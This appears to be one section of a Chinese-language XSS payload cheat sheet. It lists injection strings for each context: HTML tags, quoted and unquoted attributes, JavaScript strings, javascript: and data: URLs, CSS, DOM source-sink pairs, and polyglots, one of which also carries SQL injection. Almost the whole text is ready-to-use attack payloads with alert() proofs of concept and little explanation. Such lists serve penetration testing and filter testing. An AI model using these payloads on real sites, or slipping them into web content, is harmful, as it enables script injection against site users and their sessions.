## 二、上下文感知Payload生成

### 2.1 HTML标签之间（无过滤）
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen autofocus onfocus=alert(1)>
<iframe onload=alert(1) src=x>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<bgsound src=x onerror=alert(1)>
<link rel=import href=data:text/html,<script>alert(1)</script>>
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=image>
```

### 2.2 HTML属性值中（双引号包裹）
```html
" onmouseover=alert(1) x="
" onfocus=alert(1) autofocus x="
" onload=alert(1) x="
" onerror=alert(1) x="
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
" onpointerenter=alert(1) x="
" onanimationstart=alert(1) x="
```

### 2.3 HTML属性值中（单引号包裹）
```html
' onmouseover=alert(1) x='
'><script>alert(1)</script>
' onfocus=alert(1) autofocus x='
' onerror=alert(1) x='
```

### 2.4 无引号属性值
```html
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
 onerror=alert(1)
 =alert(1)     （某些解析器允许属性值不带等号值）
```

### 2.5 JavaScript字符串中
```javascript
// 双引号字符串
";alert(1);//
";alert(1);"
";new Function`al\ert\`1\``//
";(alert)(1);//

// 单引号字符串
';alert(1);//
';alert(1);'

// 反引号模板字符串
`;alert(1);//
${alert(1)}    （ES6模板字符串注入）
`${alert(1)}`

// 括号内
x=new Function`al\ert\`1\``;
x=eval('ale'+'rt(1)');
setTimeout`al\ert\`1\``;
setInterval`al\ert\`1\``;
Function`al\ert\`1\```();

// JS行内事件处理器（不需要分号，自动分号插入ASI）
<img src=x onerror=alert(1)>
<a href="javascript:void(0)" onclick=alert(1)>click</a>
```

### 2.6 URL属性（javascript:/data:协议）
```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>     (URL编码)
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<object data="javascript:alert(1)">
<form action="javascript:alert(1)"><button>go</button></form>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 2.7 CSS上下文中注入
```html
</style><script>alert(1)</script>
<style>@keyframes x{}b{animation:x onstart;}</style>
<style>*[x{}]{background:url(javascript:alert(1))}</style>
<div style="color:red;background:url(javascript:alert(1))">
<div style="background-image:url(javascript:alert(1))">
<div style="width:expression(alert(1))">     (IE only)
<style>body{background:url(javascript:alert(1))}</style>
<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d>
```

### 2.8 DOM XSS Source-Sink映射
```javascript
// Sources（可被用户控制的输入点）
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.baseURI / document.referrer
window.name
postMessage data（需验证origin）
localStorage/sessionStorage/indexedDB（二次存储源）
document.cookie
AJAX/JSONP回调数据
WebSocket消息 / Server-Sent Events
Workbox缓存响应 / 第三方CDN JSON

// Sinks（危险输出点）
innerHTML / outerHTML / document.write() / document.writeln()
eval() / setTimeout() / setInterval() / new Function()
location / location.href / window.open()
element.src / element.href / element.action
element.setAttribute()（动态属性名/值）
jQuery: .html() / .append() / .prepend() / .after() / .before() / $(userInput)
Angular: [innerHTML] / {{expression}} / $eval() / bypassSecurityTrustAs*
Vue: v-html / {{mustache}} / 动态组件
React: dangerouslySetInnerHTML / href={userInput}
Svelte: {@html}

// DOM XSS示例
// URL: #<img src=x onerror=alert(1)>
document.getElementById('x').innerHTML = location.hash.slice(1);
// URL: ?q=<svg onload=alert(1)>
$('div').html(getParameter('q'));
```

### 2.9 Polyglot XSS（跨上下文万能Payload）
```javascript
// 同时兼容HTML属性/HTML内容/JS字符串/URL上下文的Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// 多语言Polyglot（HTML/JS/SQL/命令注入）
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/<script>alert(1)</script>;--

// HTML+JS+URL polyglot
";alert(1);"<!--<script>alert(1)</script>-->
```

